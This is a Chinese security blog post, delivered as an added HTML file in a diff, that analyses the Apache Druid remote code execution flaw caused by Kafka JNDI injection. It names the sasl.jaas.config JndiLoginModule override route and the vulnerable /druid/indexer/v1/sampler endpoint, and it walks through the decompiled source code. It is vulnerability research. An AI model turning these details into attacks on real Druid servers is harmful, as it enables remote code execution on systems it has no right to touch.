@@ -1,0 +1,695 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="一、漏洞简介Apache KafkaKafka是由Apache软件基金会开发的一个开源流处理平台，由Scala和Java编写。该项目的目标是为处理实时数据提供一个统一、高吞吐、低延迟的平台。其持久化层本质上是一个“按照分布式事务日志架构的大规模发布&#x2F;订阅消息队列”，这使它作为企业级基础设施来处理流式数据非常有价值。 此漏洞允许服务器连接到攻击者的 LDAP 服务器并反序列化 LDAP 响">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kafka命令执行漏洞二-Apache Druid 代码执行漏洞">
+<meta property="og:url" content="http://example.com/2023/04/23/Kafka%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%BA%8C-Apache-Druid-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="白给&#39;s Blog">
+<meta property="og:description" content="一、漏洞简介Apache KafkaKafka是由Apache软件基金会开发的一个开源流处理平台，由Scala和Java编写。该项目的目标是为处理实时数据提供一个统一、高吞吐、低延迟的平台。其持久化层本质上是一个“按照分布式事务日志架构的大规模发布&#x2F;订阅消息队列”，这使它作为企业级基础设施来处理流式数据非常有价值。 此漏洞允许服务器连接到攻击者的 LDAP 服务器并反序列化 LDAP 响">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/image/kafkadruidimage-0.png">
+<meta property="og:image" content="http://example.com/image/kafkadruidimage-1.png">
+<meta property="og:image" content="http://example.com/image/kafkadruidimage-2.png">
+<meta property="og:image" content="http://example.com/image/kafkadruidimage-3.png">
+<meta property="og:image" content="http://example.com/image/kafkadruidimage-4.png">
+<meta property="og:image" content="http://example.com/image/kafkadruidimage-5.png">
+<meta property="og:image" content="http://example.com/image/kafkadruidimage-6.png">
+<meta property="og:image" content="http://example.com/image/kafkadruidimage-7.png">
+<meta property="og:image" content="http://example.com/image/kafkadruidimage-8.png">
+<meta property="og:image" content="http://example.com/image/kafkadruidimage-9.png">
+<meta property="og:image" content="http://example.com/image/kafkadruidimage-10.png">
+<meta property="article:published_time" content="2023-04-23T14:38:36.000Z">
+<meta property="article:modified_time" content="2023-04-27T11:59:21.068Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="漏洞分析">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/image/kafkadruidimage-0.png">
+  
+  
+  
+  <title>Kafka命令执行漏洞二-Apache Druid 代码执行漏洞 - 白给&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>白给&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Kafka命令执行漏洞二-Apache Druid 代码执行漏洞"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-04-23 22:38" pubdate>
+          2023年4月23日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          21 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Kafka命令执行漏洞二-Apache Druid 代码执行漏洞</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h4 id="Apache-Kafka"><a href="#Apache-Kafka" class="headerlink" title="Apache Kafka"></a>Apache Kafka</h4><p>Kafka是由Apache软件基金会开发的一个开源流处理平台，由Scala和Java编写。该项目的目标是为处理实时数据提供一个统一、高吞吐、低延迟的平台。其持久化层本质上是一个“按照分布式事务日志架构的大规模发布&#x2F;订阅消息队列”，这使它作为企业级基础设施来处理流式数据非常有价值。</p>
+<p>此漏洞允许服务器连接到攻击者的 LDAP 服务器并反序列化 LDAP 响应，攻击者可以使用它在 Kafka 连接服务器上执行 java 反序列化小工具链。当类路径中有小工具时，攻击者可以造成不可信数据的无限制反序列化（或）RCE 漏洞。</p>
+<p>此漏洞利用的前提是：需要访问 Kafka Connect worker，并能够使用任意 Kafka 客户端 SASL JAAS 配置和基于 SASL 的安全协议在其上创建&#x2F;修改连接器。 自 Apache Kafka 2.3.0 以来，这在 Kafka Connect 集群上是可能的。 通过 Kafka Connect REST API 配置连接器时，经过身份验证的操作员可以将连接器的任何 Kafka 客户端的 <code>sasl.jaas.config</code> 属性设置为“com.sun.security.auth.module.JndiLoginModule”，它可以是通过“producer.override.sasl.jaas.config”,“consumer.override.sasl.jaas.config”或“admin.override.sasl.jaas.config”属性完成。</p>
+<h4 id="Apache-Druid"><a href="#Apache-Druid" class="headerlink" title="Apache Druid"></a>Apache Druid</h4><p>Apache Druid是一个高性能的实时大数据分析引擎，支持快速数据摄取、实时查询和数据可视化。它主要用于OLAP（在线分析处理）场景，能处理PB级别的数据。Druid具有高度可扩展、低延迟和高吞吐量的特点，广泛应用于实时监控、事件驱动分析、用户行为分析、网络安全等领域。通过使用Druid，企业和开发者可以快速获得实时分析结果，提升决策效率。</p>
+<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>Apache Druid可添加Apache Kafka数据，存在Apache Kafka导致的JNDI注入漏洞，造成远程代码执行</p>
+<h4 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h4><p>Apache Druid &lt;&#x3D; 25.0</p>
+<h2 id="二、KafkaConsumer"><a href="#二、KafkaConsumer" class="headerlink" title="二、KafkaConsumer"></a>二、KafkaConsumer</h2><p>上篇讲到Producer&lt;String, String&gt; producer &#x3D; new KafkaProducer&lt;&gt;(props); 可造成JNDI注入</p>
+<p>org.apache.kafka.clients.consumer.KafkaConsumer</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">KafkaConsumer</span><span class="hljs-params">(Map&lt;String, Object&gt; configs)</span> &#123;<br>    <span class="hljs-built_in">this</span>((Map)configs, (Deserializer)<span class="hljs-literal">null</span>, (Deserializer)<span class="hljs-literal">null</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">KafkaConsumer</span><span class="hljs-params">(Properties properties)</span> &#123;<br>    <span class="hljs-built_in">this</span>((Properties)properties, (Deserializer)<span class="hljs-literal">null</span>, (Deserializer)<span class="hljs-literal">null</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">KafkaConsumer</span><span class="hljs-params">(Properties properties, Deserializer&lt;K&gt; keyDeserializer, Deserializer&lt;V&gt; valueDeserializer)</span> &#123;<br>    <span class="hljs-built_in">this</span>(Utils.propsToMap(properties), keyDeserializer, valueDeserializer);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">KafkaConsumer</span><span class="hljs-params">(Map&lt;String, Object&gt; configs, Deserializer&lt;K&gt; keyDeserializer, Deserializer&lt;V&gt; valueDeserializer)</span> &#123;<br>    <span class="hljs-built_in">this</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConsumerConfig</span>(ConsumerConfig.appendDeserializerToConfig(configs, keyDeserializer, valueDeserializer)), keyDeserializer, valueDeserializer);<br>&#125;<br><br><span class="hljs-comment">//最终调用至此构造方法</span><br>KafkaConsumer(ConsumerConfig config, Deserializer&lt;K&gt; keyDeserializer, Deserializer&lt;V&gt; valueDeserializer) &#123;<br>    <span class="hljs-built_in">this</span>.closed = <span class="hljs-literal">false</span>;<br>    <span class="hljs-built_in">this</span>.currentThread = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicLong</span>(-<span class="hljs-number">1L</span>);<br>    <span class="hljs-built_in">this</span>.refcount = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">GroupRebalanceConfig</span> <span class="hljs-variable">groupRebalanceConfig</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GroupRebalanceConfig</span>(config, ProtocolType.CONSUMER);<br>        <span class="hljs-built_in">this</span>.groupId = Optional.ofNullable(groupRebalanceConfig.groupId);<br>        <span class="hljs-built_in">this</span>.clientId = config.getString(<span class="hljs-string">&quot;client.id&quot;</span>);<br>        LogContext logContext;<br>        <span class="hljs-keyword">if</span> (groupRebalanceConfig.groupInstanceId.isPresent()) &#123;<br>            logContext = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogContext</span>(<span class="hljs-string">&quot;[Consumer instanceId=&quot;</span> + (String)groupRebalanceConfig.groupInstanceId.get() + <span class="hljs-string">&quot;, clientId=&quot;</span> + <span class="hljs-built_in">this</span>.clientId + <span class="hljs-string">&quot;, groupId=&quot;</span> + (String)<span class="hljs-built_in">this</span>.groupId.orElse(<span class="hljs-string">&quot;null&quot;</span>) + <span class="hljs-string">&quot;] &quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            logContext = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogContext</span>(<span class="hljs-string">&quot;[Consumer clientId=&quot;</span> + <span class="hljs-built_in">this</span>.clientId + <span class="hljs-string">&quot;, groupId=&quot;</span> + (String)<span class="hljs-built_in">this</span>.groupId.orElse(<span class="hljs-string">&quot;null&quot;</span>) + <span class="hljs-string">&quot;] &quot;</span>);<br>        &#125;<br><br>        <span class="hljs-built_in">this</span>.log = logContext.logger(<span class="hljs-built_in">this</span>.getClass());<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">enableAutoCommit</span> <span class="hljs-operator">=</span> config.maybeOverrideEnableAutoCommit();<br>        <span class="hljs-built_in">this</span>.groupId.ifPresent((groupIdStr) -&gt; &#123;<br>            <span class="hljs-keyword">if</span> (groupIdStr.isEmpty()) &#123;<br>                <span class="hljs-built_in">this</span>.log.warn(<span class="hljs-string">&quot;Support for using the empty group id by consumers is deprecated and will be removed in the next major release.&quot;</span>);<br>            &#125;<br><br>        &#125;);<br>        <span class="hljs-built_in">this</span>.log.debug(<span class="hljs-string">&quot;Initializing the Kafka consumer&quot;</span>);<br>        <span class="hljs-built_in">this</span>.requestTimeoutMs = (<span class="hljs-type">long</span>)config.getInt(<span class="hljs-string">&quot;request.timeout.ms&quot;</span>);<br>        <span class="hljs-built_in">this</span>.defaultApiTimeoutMs = config.getInt(<span class="hljs-string">&quot;default.api.timeout.ms&quot;</span>);<br>        <span class="hljs-built_in">this</span>.time = Time.SYSTEM;<br>        <span class="hljs-built_in">this</span>.metrics = buildMetrics(config, <span class="hljs-built_in">this</span>.time, <span class="hljs-built_in">this</span>.clientId);<br>        <span class="hljs-built_in">this</span>.retryBackoffMs = config.getLong(<span class="hljs-string">&quot;retry.backoff.ms&quot;</span>);<br>        List&lt;ConsumerInterceptor&lt;K, V&gt;&gt; interceptorList = config.getConfiguredInstances(<span class="hljs-string">&quot;interceptor.classes&quot;</span>, ConsumerInterceptor.class, Collections.singletonMap(<span class="hljs-string">&quot;client.id&quot;</span>, <span class="hljs-built_in">this</span>.clientId));<br>        <span class="hljs-built_in">this</span>.interceptors = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConsumerInterceptors</span>(interceptorList);<br>        <span class="hljs-keyword">if</span> (keyDeserializer == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-built_in">this</span>.keyDeserializer = (Deserializer)config.getConfiguredInstance(<span class="hljs-string">&quot;key.deserializer&quot;</span>, Deserializer.class);<br>            <span class="hljs-built_in">this</span>.keyDeserializer.configure(config.originals(Collections.singletonMap(<span class="hljs-string">&quot;client.id&quot;</span>, <span class="hljs-built_in">this</span>.clientId)), <span class="hljs-literal">true</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            config.ignore(<span class="hljs-string">&quot;key.deserializer&quot;</span>);<br>            <span class="hljs-built_in">this</span>.keyDeserializer = keyDeserializer;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (valueDeserializer == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-built_in">this</span>.valueDeserializer = (Deserializer)config.getConfiguredInstance(<span class="hljs-string">&quot;value.deserializer&quot;</span>, Deserializer.class);<br>            <span class="hljs-built_in">this</span>.valueDeserializer.configure(config.originals(Collections.singletonMap(<span class="hljs-string">&quot;client.id&quot;</span>, <span class="hljs-built_in">this</span>.clientId)), <span class="hljs-literal">false</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            config.ignore(<span class="hljs-string">&quot;value.deserializer&quot;</span>);<br>            <span class="hljs-built_in">this</span>.valueDeserializer = valueDeserializer;<br>        &#125;<br><br>        <span class="hljs-type">OffsetResetStrategy</span> <span class="hljs-variable">offsetResetStrategy</span> <span class="hljs-operator">=</span> OffsetResetStrategy.valueOf(config.getString(<span class="hljs-string">&quot;auto.offset.reset&quot;</span>).toUpperCase(Locale.ROOT));<br>        <span class="hljs-built_in">this</span>.subscriptions = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SubscriptionState</span>(logContext, offsetResetStrategy);<br>        <span class="hljs-type">ClusterResourceListeners</span> <span class="hljs-variable">clusterResourceListeners</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.configureClusterResourceListeners(keyDeserializer, valueDeserializer, <span class="hljs-built_in">this</span>.metrics.reporters(), interceptorList);<br>        <span class="hljs-built_in">this</span>.metadata = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConsumerMetadata</span>(<span class="hljs-built_in">this</span>.retryBackoffMs, config.getLong(<span class="hljs-string">&quot;metadata.max.age.ms&quot;</span>), !config.getBoolean(<span class="hljs-string">&quot;exclude.internal.topics&quot;</span>), config.getBoolean(<span class="hljs-string">&quot;allow.auto.create.topics&quot;</span>), <span class="hljs-built_in">this</span>.subscriptions, logContext, clusterResourceListeners);<br>        List&lt;InetSocketAddress&gt; addresses = ClientUtils.parseAndValidateAddresses(config.getList(<span class="hljs-string">&quot;bootstrap.servers&quot;</span>), config.getString(<span class="hljs-string">&quot;client.dns.lookup&quot;</span>));<br>        <span class="hljs-built_in">this</span>.metadata.bootstrap(addresses);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">metricGrpPrefix</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;consumer&quot;</span>;<br>        <span class="hljs-type">FetcherMetricsRegistry</span> <span class="hljs-variable">metricsRegistry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FetcherMetricsRegistry</span>(Collections.singleton(<span class="hljs-string">&quot;client-id&quot;</span>), metricGrpPrefix);<br>        <span class="hljs-comment">//调用至ClientUtils.createChannelBuilder 接下来调用链与一相同，不再赘述</span><br>        <span class="hljs-type">ChannelBuilder</span> <span class="hljs-variable">channelBuilder</span> <span class="hljs-operator">=</span> ClientUtils.createChannelBuilder(config, <span class="hljs-built_in">this</span>.time, logContext);<br>        <span class="hljs-built_in">this</span>.isolationLevel = IsolationLevel.valueOf(config.getString(<span class="hljs-string">&quot;isolation.level&quot;</span>).toUpperCase(Locale.ROOT));<br>        <span class="hljs-type">Sensor</span> <span class="hljs-variable">throttleTimeSensor</span> <span class="hljs-operator">=</span> Fetcher.throttleTimeSensor(<span class="hljs-built_in">this</span>.metrics, metricsRegistry);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">heartbeatIntervalMs</span> <span class="hljs-operator">=</span> config.getInt(<span class="hljs-string">&quot;heartbeat.interval.ms&quot;</span>);<br>        <span class="hljs-type">ApiVersions</span> <span class="hljs-variable">apiVersions</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApiVersions</span>();<br>        <span class="hljs-type">NetworkClient</span> <span class="hljs-variable">netClient</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NetworkClient</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Selector</span>(config.getLong(<span class="hljs-string">&quot;connections.max.idle.ms&quot;</span>), <span class="hljs-built_in">this</span>.metrics, <span class="hljs-built_in">this</span>.time, metricGrpPrefix, channelBuilder, logContext), <span class="hljs-built_in">this</span>.metadata, <span class="hljs-built_in">this</span>.clientId, <span class="hljs-number">100</span>, config.getLong(<span class="hljs-string">&quot;reconnect.backoff.ms&quot;</span>), config.getLong(<span class="hljs-string">&quot;reconnect.backoff.max.ms&quot;</span>), config.getInt(<span class="hljs-string">&quot;send.buffer.bytes&quot;</span>), config.getInt(<span class="hljs-string">&quot;receive.buffer.bytes&quot;</span>), config.getInt(<span class="hljs-string">&quot;request.timeout.ms&quot;</span>), config.getLong(<span class="hljs-string">&quot;socket.connection.setup.timeout.ms&quot;</span>), config.getLong(<span class="hljs-string">&quot;socket.connection.setup.timeout.max.ms&quot;</span>), <span class="hljs-built_in">this</span>.time, <span class="hljs-literal">true</span>, apiVersions, throttleTimeSensor, logContext);<br>    	......<br>    &#125; <span class="hljs-keyword">catch</span> (Throwable var18) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.log != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-built_in">this</span>.close(<span class="hljs-number">0L</span>, <span class="hljs-literal">true</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">KafkaException</span>(<span class="hljs-string">&quot;Failed to construct kafka consumer&quot;</span>, var18);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="三、Apache-Druid环境配置"><a href="#三、Apache-Druid环境配置" class="headerlink" title="三、Apache Druid环境配置"></a>三、Apache Druid环境配置</h2><p>1、修改jvm.config，远程debug</p>
+<p>目录为apache-druid-xxx\conf\druid\single-server\micro-quickstart\coordinator-overlord\jvm.config</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=<span class="hljs-number">5005</span><br>suspend=n表示的是启动Java应用时是否立即进入调试模式;<br>suspend=y表示启动即暂停，suspend=n则表示启动时不需要暂停;<br>address=*:<span class="hljs-number">5005</span>表示的是Debug监听的服务地址和端口，根据需求修改，上述配置会监听到<span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/kafkadruidimage-0.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>2、启动Apache Druid</p>
+<p>运行bin&#x2F;下start-micro-quickstart</p>
+<p><img src="/image/kafkadruidimage-1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>访问ip:8888,成功访问</p>
+<p><img src="/image/kafkadruidimage-2.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="四、漏洞分析"><a href="#四、漏洞分析" class="headerlink" title="四、漏洞分析"></a>四、漏洞分析</h2><h3 id="前端输入"><a href="#前端输入" class="headerlink" title="前端输入"></a>前端输入</h3><p>Apache Druid添加kafka</p>
+<p><img src="/image/kafkadruidimage-3.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>存在漏洞API接口为&#x2F;druid&#x2F;indexer&#x2F;v1&#x2F;sampler</p>
+<p>接口类如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//路径</span><br><span class="hljs-meta">@Path(&quot;/druid/indexer/v1/sampler&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SamplerResource</span>&#123;<br>  <span class="hljs-comment">//post方法  </span><br>  <span class="hljs-meta">@POST</span><br>  <span class="hljs-comment">//指定http请求的MIME类型为application/json</span><br>  <span class="hljs-meta">@Consumes(MediaType.APPLICATION_JSON)</span><br>  <span class="hljs-comment">//指定http响应的MIME类型application/json</span><br>  <span class="hljs-meta">@Produces(MediaType.APPLICATION_JSON)</span><br>  <span class="hljs-meta">@ResourceFilters(StateResourceFilter.class)</span><br>  <span class="hljs-keyword">public</span> SamplerResponse <span class="hljs-title function_">post</span><span class="hljs-params">(<span class="hljs-keyword">final</span> SamplerSpec sampler)</span>&#123;<br>    <span class="hljs-comment">//Preconditions.checkNotNull(sampler, &quot;Request body cannot be empty&quot;) 判断sampler是否为空</span><br>    <span class="hljs-comment">//调用sampler#sample()方法</span><br>    <span class="hljs-keyword">return</span> Preconditions.checkNotNull(sampler, <span class="hljs-string">&quot;Request body cannot be empty&quot;</span>).sample();<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>org.apache.druid.client.indexing.SamplerSpec为接口，声明方法sample()</p>
